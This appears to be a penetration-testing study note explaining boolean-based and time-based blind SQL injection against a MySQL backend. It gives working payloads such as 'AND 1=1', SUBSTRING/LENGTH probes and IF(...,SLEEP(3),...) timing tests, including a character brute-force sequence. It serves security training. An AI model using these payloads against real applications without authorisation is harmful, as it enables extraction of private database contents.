## Purpose

Blind SQL Injection occurs when:

```
the application does NOT return database query results directly
```

Instead, we infer results indirectly via:

- application behaviour
- response timing
- page differences
- error presence/absence

Unlike in-band SQLi, we cannot see database output directly.

---

# Types of Blind SQL Injection

Two primary techniques:

1. Boolean-based Blind SQLi
2. Time-based Blind SQLi

Both rely on observing application behaviour instead of query results.

---

# Why Blind SQLi Matters

Blind SQL injection is extremely common in real-world applications because:

- error messages are disabled
- results are not displayed
- output is sanitized
- generic responses are used

Despite this, databases still evaluate our injected queries.

We extract data bit-by-bit using logic conditions.

---

# Boolean-Based Blind SQL Injection

Boolean-based SQL injection relies on:

```
TRUE vs FALSE responses
```

If the injected condition evaluates to TRUE:

```
application behaves normally
```

If FALSE:

```
application behaves differently
```

Examples of observable differences:

- page content changes
- login success vs failure
- record exists vs does not exist
- redirect occurs
- error message disappears
- content length changes

---

# Example Scenario

Application parameter:

```
blindsqli.php?user=offsec
```

Backend query:

```sql
SELECT * FROM users WHERE username = 'offsec';
```

---

# Boolean Test Payload

```sql
offsec' AND 1=1-- -
```

URL encoded:

```
http://target/blindsqli.php?user=offsec' AND 1=1-- -
```

---

## Result

Condition:

```
1=1 = TRUE
```

Application returns normal response.

---

# False Condition Test

```sql
offsec' AND 1=2-- -
```

Result:

```
1=2 = FALSE
```

Application behaves differently.

---

# Practical Use

We can enumerate database information by asking TRUE/FALSE questions:

---

## Example – check DB name first letter

```sql
' AND SUBSTRING(database(),1,1)='i'-- -
```

If TRUE:

```
database starts with "i"
```

---

## Example – enumerate username length

```sql
' AND LENGTH(username)=5-- -
```

---

## Example – enumerate characters

```sql
' AND SUBSTRING(username,1,1)='a'-- -
```

---

# Time-Based Blind SQL Injection

Time-based SQLi is used when:

```
application responses look identical
```

We infer TRUE/FALSE using response delay.

---

# MySQL Time Delay Function

```sql
SLEEP(seconds)
```

---

# Example Payload

```sql
offsec' AND IF(1=1,SLEEP(3),'false')-- -
```

---

## Behaviour

If condition TRUE:

```
response delayed by 3 seconds
```

If FALSE:

```
normal response time
```

---

# Example URL

```
http://target/blindsqli.php?user=offsec' AND IF(1=1,SLEEP(3),'false')-- -
```

---

# False Condition Example

```sql
offsec' AND IF(1=2,SLEEP(3),'false')-- -
```

Result:

```
no delay
```

---

# Enumerating Data with Time-Based SQLi

We extract information one character at a time.

---

## Example – check database name length

```sql
' AND IF(LENGTH(database())=8,SLEEP(3),0)-- -
```

---

## Example – identify first character

```sql
' AND IF(SUBSTRING(database(),1,1)='i',SLEEP(3),0)-- -
```

---

## Example – brute force characters

```sql
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -
' AND IF(SUBSTRING(database(),1,1)='b',SLEEP(3),0)-- -
' AND IF(SUBSTRING(database(),1,1)='c',SLEEP(3),0)-- -
```

Continue until delay observed.

# Boolean vs Time-Based Comparison

| Type | Method | Visibility |
|------|--------|------------|
| Boolean-based | TRUE/FALSE page change | visible difference |
| Time-based | response delay | timing difference |
| Error-based | DB error messages | verbose output |
| Union-based | direct data extraction | visible output |

# Key Takeaways

- Blind SQLi does not display database output
- information inferred via logic or timing
- slower than UNION-based SQLi
- highly common in hardened applications
- easily automated with tooling
